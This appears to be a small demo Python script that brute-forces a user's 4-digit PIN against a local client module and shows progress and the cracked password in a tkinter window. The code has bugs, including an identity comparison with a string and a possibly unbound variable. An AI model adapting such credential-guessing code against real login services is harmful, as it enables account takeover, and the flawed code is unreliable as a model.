from client import request
import time
import tkinter as tk
start = time.time()

def brute(user_name, text_field):
    start = time.time()
    iter = 0
    for i in range(10000):
        iter+=1
        passwd = str(i)
        if(i<1000):
            passwd = "0"*(4-len(passwd)) + passwd
        if(i%100==0):
            text_field.insert(tk.END, f'attempting {passwd}\n')
        try:
            response = request(user_name, passwd)
            end = time.time()
            if(response!="False"):
                text_field.insert(tk.END, f"\nSUCCESS username '{user_name}' with password '{passwd}' found ...")
                text_field.insert(tk.END, f"\nPassword Cracked in {(end-start)} seconds")
                text_field.insert(tk.END, f"\nat iter '{iter}'")
                break
        except Exception as e:
            print(e)
    if response is "False":
        text_field.insert(tk.END, f"No mating password found for User '{user_name}'...Try anoter UserName")

